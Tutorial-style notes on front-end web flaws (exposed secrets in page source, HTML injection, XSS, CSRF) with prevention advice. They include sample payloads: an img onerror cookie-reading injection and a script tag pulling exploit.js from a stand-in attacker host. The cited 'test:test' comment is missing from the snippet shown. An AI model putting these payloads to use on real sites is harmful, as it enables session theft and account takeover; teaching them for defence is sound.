## Sensitive Data Exposure 

Front-end components run on the client-side (the user's browser). While an attack here doesn't always damage the back-end server immediately, it poses a significant risk to the end-user and can serve as a stepping stone for full system compromise.

### The  Risk

If a front-end vulnerability is used to target administrative users, an attacker can gain unauthorized access to sensitive data or administrative panels. This "lateral movement" from a client-side flaw to back-end access is a common path for compromising entire servers.

### Defining Sensitive Data Exposure

This occurs when sensitive information is available in **clear-text** within the front-end source code.

- **Location:** Primarily found in the HTML source code, JavaScript files, or external links.
    
- **Accessibility:** Anyone can view this by right-clicking and selecting "View Page Source" or using the shortcut `Ctrl + U`.
    
- **Bypassing Restrictions:** Even if a developer disables right-clicking, the source remains accessible through browser shortcuts or intercepting proxies like Burp Suite.
    

### Common "Low-Hanging Fruit"

During an assessment, the page source is often the first place to look for:

- **Developer Comments:** Reminders like `` are frequent oversights.
    
- **Hardcoded Credentials:** API keys, test account logins, or hashes.
    
- **Hidden Links/Directories:** Links to admin panels, staging environments, or internal API endpoints not visible on the UI.
    
- **Debugging Information:** Parameters that reveal how the back-end processes data.
    

### Analysis of a Vulnerable Code Snippet

In the example provided, a standard login form hides a critical error in its HTML:
```
<form action="action_page.php" method="post">
    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>
        <label for="psw"><b>Password</b></label>
        <input type="password" required>
        <button type="submit">Login</button>
    </div>
</form>
```

The comment `test:test` provides immediate, valid credentials to any user who looks behind the UI.
### Prevention and Mitigation Strategies

- **Minimize Code:** Ensure the front-end only contains the code strictly necessary for functionality. Remove all non-essential comments and metadata before deployment.
    
- **Data Classification:** Identify what data is being sent to the client. Apply strict controls to ensure sensitive back-end logic or credentials never reach the front-end.
    
- **Code Review & Auditing:** Manually review client-side code and use automated scanners to detect exposed paths, secrets, or sensitive strings.
    
- **Obfuscation:** Use JavaScript packing or obfuscation. While this isn't a "fix," it makes it harder for automated tools and casual observers to parse sensitive logic or find hidden data.
    
- **Environment Hygiene:** Ensure that "Test" or "Dev" credentials and links are stripped out during the build process before the code reaches the production environment.

## HTML Injection

HTML Injection occurs when a web application takes user input and displays it on a page without properly filtering or sanitizing it first. While many security checks happen on the back end, some input is processed entirely within the browser via JavaScript, making front-end validation just as critical.

### How It Works
When a user can control how their input is rendered, they can submit actual HTML tags instead of plain text. The browser, unable to distinguish between the developer's original code and the user's input, executes the injected tags as part of the page.

There are two primary ways this happens:

1. **Stored (Back-end):** Malicious code is saved in a database (like a comment or profile bio) and rendered later for other users.
    
2. **Reflected/Client-side (Front-end):** Input is directly processed by JavaScript and immediately written to the page (e.g., a "Welcome [Name]" message).
    

### Common Impact

- **Credential Theft:** An attacker can inject a fake login form over the legitimate page. Unsuspecting users enter their credentials, which are then sent to the attacker's server.
    
- **Defacement:** Attackers can change the visual appearance of a site, insert unauthorized ads, or replace content with offensive material. This causes massive reputational damage.
    
- **Phishing:** Redirecting users to malicious sites or displaying fake security warnings to trick them into downloading malware.
    

### Technical Example: Unsanitized Input

Consider a script that asks for a name and displays it using the `.innerHTML` property:
```
<script>
    function inputFunction() {
        var input = prompt("Please enter your name", "");
        if (input != null) {
            // VULNERABLE LINE: Directly inserting input into the HTML structure
            document.getElementById("output").innerHTML = "Your name is " + input;
        }
    }
</script>
```

If a user enters a standard name, it works as intended. However, if they enter a style block: `<style> body { background-image: url('https://attacker.com/image.jpg'); } </style>`

The browser interprets this as a command to change the CSS of the body, instantly altering the page's appearance.

### Prevention 

- **Sanitize and Filter:** Always strip out or encode dangerous characters (like `<`, `>`, `"`, and `'`) before rendering them.
    
- **Use Safer Methods:** Instead of using `.innerHTML`, which parses strings as HTML, use `.innerText` or `.textContent`. These methods treat all input as literal text, preventing the browser from executing injected code.
    
- **Context-Aware Encoding:** Ensure that data is encoded correctly for where it will be placed (e.g., HTML body vs. a JavaScript variable).
    
- **Defense in Depth:** Never rely on front-end validation alone. Even if the front end is secure, an attacker can bypass the UI and send malicious data directly to the back-end API. Both layers must be protected.

## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript into a web page viewed by other users. While HTML Injection focuses on changing the page's appearance or structure, XSS focuses on executing scripts to interact with the user's session, browser, or local data.

### The Three Main Types of XSS

Understanding the "flow" of the data is key to identifying which type of XSS is present.

|**Type**|**Description**|**Common Example**|
|---|---|---|
|**Reflected XSS**|The script is "reflected" off the web server to the user's browser. It is not stored permanently.|A malicious link in an email that includes a script in a URL parameter (e.g., a search query).|
|**Stored XSS**|The script is permanently stored on the target server (e.g., in a database).|A malicious script hidden in a forum post or a user profile comment that executes for anyone viewing that page.|
|**DOM XSS**|The vulnerability exists entirely in the client-side code. The script executes as a result of modifying the Document Object Model (DOM).|A script that reads a value from the URL hash (`#`) and writes it directly to the page using `innerHTML`.|

### How XSS is Leveraged

XSS is significantly more dangerous than simple HTML injection because JavaScript has access to sensitive browser objects.

- **Session Hijacking:** Attackers can use `document.cookie` to steal session tokens. If the `HttpOnly` flag is missing, the script can send these tokens to an external server, allowing the attacker to impersonate the victim.
    
- **Unauthorized Actions:** A script can perform actions on behalf of the user, such as changing passwords, deleting data, or posting content without the user's knowledge.
    
- **Phishing & Data Theft:** Sophisticated scripts can capture keystrokes (keylogging) or scrape sensitive information displayed on the screen.
    

### Technical Breakdown: The Payload

In the previous HTML Injection example, the code was vulnerable because it used `.innerHTML`. An attacker can move from changing a background image to executing code using a payload like this:
```
#"><img src=/ onerror=alert(document.cookie)>
```

**Why this works:**

1. **Breaking Out:** The `">` part of the payload attempts to close any existing HTML tags to ensure the browser processes what follows as a new element.
    
2. **The Trigger:** The `<img src=/>` creates an image tag with an invalid source.
    
3. **The Execution:** Because the source is invalid, the `onerror` event handler triggers. The browser then executes the JavaScript inside: `alert(document.cookie)`.
    

### Prevention 

- **Never Trust User Input:** Treat all data coming from a user as untrusted, whether it's from a URL, a form, or a database.
    
- **Output Encoding:** Before rendering data, convert special characters into their HTML entity equivalents (e.g., `<` becomes `&lt;`).
    
- **Use Modern APIs:** Avoid `.innerHTML`. Use `.textContent` or `.innerText` which automatically treat input as plain text.
    
- **Content Security Policy (CSP):** Implement a strong CSP header to restrict which scripts are allowed to run and prevent them from sending data to unknown external domains.

## Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently logged in. Unlike XSS, which aims to steal data (like cookies), CSRF aims to **state-change**: changing passwords, transferring funds, or updating email addresses without the user's knowledge.

### How CSRF Works

CSRF relies on the fact that browsers automatically include ambient credentials—like session cookies—with every request sent to a website. If a user is logged into `bank.com` and visits a malicious site in another tab, the malicious site can trigger a request to `bank.com`. The browser will attach the user's session cookie, and the bank’s server will treat the request as legitimate.

### Common Attack Scenarios

- **Password Change:** An attacker crafts a script that mimics a "Change Password" request. If an admin views a page containing this script, their password is changed to one the attacker knows, leading to a full account takeover.
    
- **Privilege Escalation:** If an administrator is targeted, the attacker might trigger actions that create new admin accounts or modify server configurations.
    
- **External Payloads:** Instead of writing the full exploit in a comment, an attacker might link to a remote script: `"><script src=//attacker-site.com/exploit.js></script>` The `exploit.js` file would contain the specific logic required to interact with the target application’s API.
    
### Defense and Prevention Strategies

Securing an application against CSRF and injection requires a multi-layered "defense in depth" approach.

#### 1. Input Handling: Sanitization vs. Validation

|Method|Action|Example|
|---|---|---|
|**Sanitization**|Stripping or encoding special characters (`<`, `>`, `&`).|Converting `<script>` to `&lt;script&gt;`.|
|**Validation**|Checking if input matches a specific, expected format.|Ensuring an "Age" field only contains numbers.|


#### 2. Anti-CSRF Tokens

The most common defense is the use of a **CSRF Token**. This is a unique, secret, and unpredictable value generated by the server for the user's session.

- The token must be included in any state-changing request (POST, PUT, DELETE).
    
- The server rejects any request that does not contain the correct token. Since an attacker cannot see the user's screen or cookies due to the **Same-Origin Policy**, they cannot guess this token.
    

#### 3. Browser-Level Protections

- **SameSite Cookie Attribute:** * `SameSite=Strict`: Cookies are only sent for requests originating from the same site.
    
    - `SameSite=Lax`: A middle ground that allows cookies on safe top-level navigations (like clicking a link) but blocks them on cross-site sub-requests (like images or frames).
        
- **WAF (Web Application Firewall):** An appliance that sits in front of the web server to block known attack patterns. While helpful, it is a "band-aid" and not a substitute for secure code.
    

#### 4. Functional Defenses

Implementing "re-authentication" for sensitive actions—such as requiring the current password before allowing a password change—is one of the most effective ways to stop a CSRF attack from succeeding, even if the attacker bypasses other tokens.
